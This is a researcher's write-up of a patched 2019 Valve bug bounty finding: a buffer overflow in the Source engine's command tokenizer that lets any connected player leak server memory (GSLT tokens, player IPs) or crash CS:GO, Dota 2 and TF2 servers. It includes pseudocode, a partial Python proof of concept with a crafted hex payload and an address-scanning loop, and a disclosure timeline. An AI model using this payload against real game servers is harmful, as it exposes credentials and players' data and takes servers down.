# Valve Bug Bounty

![csgo in game console leaking a GSLT token](/images/featured.jpg)

For many years CS:GO, Dota 2, and Team Fortress 2 servers had a bug that allowed malicious users to leak crucial server process memory or reliably crash any server.

In 2019, a fellow hacker and I conducted this research by digging into the Valve dedicated server with a fuzzer, elbow grease, and plenty of reverse-engineering.

## I'm not sure the server should be sending that information to us in our in-game console...

![GIF showing the csgo in game console printing server memory information](/images/csgo_leak_rcon.gif)

## Leaking server process memory - Official GSLT tokens that authenticate Valve servers

![csgo in game console leaking a GSLT token](/images/csgo_leak_gslt.jpg)

We used AFL to fuzz the counter strike server, `srcds.exe`. Next, we found some likely places to hook in the server and landed on the function `ExecuteStringCommand()` in `engine.dll`.  This is the function responsible for taking user console input and executing it on the server to do things like:

```
/say hello all
/sayteam hello team
sv_cheats 1
```

The server takes the input from the user, tokenizes it (e.g. "/say hello all" becomes { "/say", "hello", "all" }).

Suppose a user sends a malicious string to the server. In that case, the server will leak back process memory, which contains sensitive GSLT server tokens and anything else in the process memory, or crash. The server passes a pointer to `sprintf("Unknown command: %s", ...)` that we control.

The bug has likely been present in all of these games for many, many years.

___

## Technical Details (CVSS 8.2)

### Overview

Entering an unknown command into the in-game console, passes it to the server which will find and run the command. The server will tokenize the command string, with the first token treated as the command name and subsequent tokens as arguments. Each token is copied into a string buffer, null-terminated, and a corresponding pointer to the token will be copied into a second buffer just below.

If the server can't find a matching command, it lets the client know by returning a message with the format "Unknown command: %s" and the command name as the argument.

Because the buffer containing the null-terminated tokens and the buffer containing the pointers are adjacent, overflowing the first buffer allows overwriting the pointers in the second buffer with user-control data. When the first token pointer is later used as an argument to ```sprintf()```, the server memory contents at that address will be returned to the client, or an invalid pointer can be supplied, crashing the server.

### Tested On

* Dota 2 ClientVersion 3476 (dota2.exe, localhost lobby)
* CS:GO 1.36.9.5 (srcds.exe)
* Team Fortress 2 ClientVersion 5097991 (srcds.exe)

### Impact

* This exploit affects 3 of the top 7 games on Steam: Dota 2, CS:GO, Team Fortress 2.
* We were able to leak our Game Server Login Token (GSLT), connected players’ IP addresses, any messages from the server's console, etc.
* We were able to 100% reliably crash our server by supplying an invalid memory address.
* Any player logged on to the server can send the command, even spectators.
* The overflowed buffer is on the stack, meaning RCE would be possible if enough pointers were overwritten; however, we could only overwrite 14 in our initial tests.
* Tested on Windows and Linux (Windows 10 1803, Ubuntu 18.04).


### Details

When a server receives a client’s string command, it gets passed into ```ExecuteStringCommand()``` for processing, which calls ```CCommand::Tokenize()``` to extract the command name and arguments. During this process the command name and arguments are tokenized and copied to ```m_pArgvBuffer``` and a null-terminator is placed at the end of the token. A pointer to each token is then placed in ```m_ppArgv```. We believe the cause of the exploit is not properly accounting for the length of null-terminators, or possibly special characters, during tokenization. This allows ```m_pArgvBuffer``` to be overflowed.

After tokenization, the server will attempt to find and run the command. However, if no matching command is found, the name of the command, which is held in ```m_ppArgv[0]```, is passed to a sprintf-like function and returned to the client. This results in the following:

* If ```m_ppArgv[0]``` has been overwritten with a valid memory address, then arbitrary data will be returned to the client due to the sprintf argument pointing to arbitrary memory, with some limitations.
* Data cannot be longer than 128 bytes due to a length check on the command name.
* Data will stop at the first null.
* If ```m_ppArgv[0]``` has been overwritten with an invalid memory address, the server will crash with a memory access violation when comparing the command name.

### Pseudocode

```c++
class CCommand
{
    ...
    char   m_pArgvBuffer[512];    // Holds null-terminated tokens. This is the buffer we overflow.
    char*  m_ppArgv[64];          // Holds pointers to each token. Victim buffer.
    ...
}

CGameClient::ExecuteStringCommand(char* pCommand)
{
    CCommand cmd;

    // After this call m_pArgVBuffer has overflowed into m_ppArgv.
    cmd::Tokenize(pCommand, 3, 0);

    ...

    // This is sent back to the client. If the pointer has been overwritten
    // data at that address will be leaked.
    UTIL_VarArgs("Unknown command: %s\n", cmd.m_ppArgv[0])
}
```

### Reproduction

1. Pass a malformed command to ExecuteStringCommand().

Notes:

* In our PoC code we locate and call ```CCommand::Tokenize()``` in ```engine.dll``` with our test data to demonstrate the overflow.
* In our memory-enumeration demo we send a specially-crafted payload, which has the target address positioned to overwrite the necessary pointer.
* ```SendDatagram()``` is used directly to avoid length and encoding restrictions imposed by the in-game console, resulting in more reliable exploitation.

## Partial Memory Disclosure POC

```python
...

# Returns data with a header prepended
def make_chat_packet(cmd_data):

    cmdlen = bitpack(len(cmd_data))
    packetlen = bitpack(len(cmdlen) + len(cmd_data) + 1)

    # <cmd> <packetlen> 0A <cmdlen> <cmd>
    packet = bytearray()
    packet.append(0x05)
    packet += packetlen
    packet.append(0x0A)
    packet += cmdlen
    packet += cmd_data

    return packet

cmd_data =  "\x73\x61\x79\x20\x22\x80\x80\x80\x80\x80\x80\x80\x6f\x72\x77\x7e\x22\x6c\x72\x72\x72\x72\x72\x72\x72\x72\x72\x72\x72\x72\x72\x72\x72\x72\x72\x72\x72\x72\x72\x72\x72\x6c\x90\x20\x77\x6f\x0b\x2b\x2b\x2b\x2b\x2b\x2b\x2b\x2b\x2b\x2b\x2b\x36\x35\x35\x50\x7f\x33\x35\x35\x2b\x2b\x2b\x1d\x2b\x36\x35\x06\x35\x35\x35\x35\x58\x35\x33\x35\x35\x35\x35\x35\x35\x35\x34\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x2c\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x37\x35\xff\xff\xff\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x37\x35\x3f\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x37\x35\x3f\x35\x3b\xff\xff\xff\x7f\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x47\x35\x3f\x35\x35\x35\x35\x35\x35\x37\x35\xff\xff\xff\x35\x35\x35\x35\x35\x64\x37\x35\x23\x35\x35\x35\x49\x6f\x20\x3c\x35\x35\x1f\x53\x2b\x35\x2b\x2b\x35\x35\x35\x35\x35\x35\x2c\x35\x35\x35\x35\x35\x35\x35\x35\x37\x35\x3f\x35\x35\x35\x35\x35\x4a\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x01\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x77\x6f\x2b\x2b\x2b\x2b\x2b\x2b\x2b\x2b\x2b\x2b\x2b\x2b\x36\x35\x33\x35\x35\x2b\x2b\x2b\x2b\x2b\x36\x35\x12\x35\x35\x35\x35\x58\x35\x33\x35\x35\x35\x35\x35\x26\x35\x35\x72\x35\x35\x35\x35\x35\x37\x35\xff\xff\xff\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x37\x35\x3f\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x37\x35\x3f\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x3f\x35\x35\x35\x35\x35\x35\x37\x35\xff\xff\xff\x35\x35\x35\x35\x35\x35\x37\x35\x23\x35\x35\x35\x49\x6f\x20\x3c\x3f\x35\x1f\x53\x6c\x6c\x6c\x6c\x6c\x35\x35\x35\x35\x35\x2c\x35\x35\x35\x35\x35\x35\x35\x35\x37\x35\x3f\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x35\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x35\x35\x2c\x31\x2b\x2b\x2b\x2b\x2b\x2b\x35\x35\x22\x21\x05\x2c\x05"

packet = make_chat_packet(cmd_data)

# Address to read from
addr = 0x124DB120
end = addr + 0x100
step = 8

while addr + step < end:
    # Check we can get this address
    valid = check_ptr(addr)
    if valid:
        print(f'Leaking server memory at {hex(addr)}')
        addr_bytes = pack('i', int(addr))
        packet[-4:] = addr_bytes
        # Exploit
        send_packet(packet)
        time.sleep(0.15)
    else:
        print(f'Skipping {hex(addr)}')
    addr += step
```

---

## Disclosure timeline:
* May 15th, 2019 - Write-up and proof of concept submitted to Valve.
* May 20th, 2019 - POC verified.
* Sept. 4th, 2019 - Valve awarded $7,500 bounty "because of the potential business impact of memory disclosure of official game servers."
* Dec. 2019 - Valve patched the vulnerability.
* August 2021 - Valve notified us they fixed the issue in 2019. After following up with hackerone for 2 years.

___

❤️ for reading.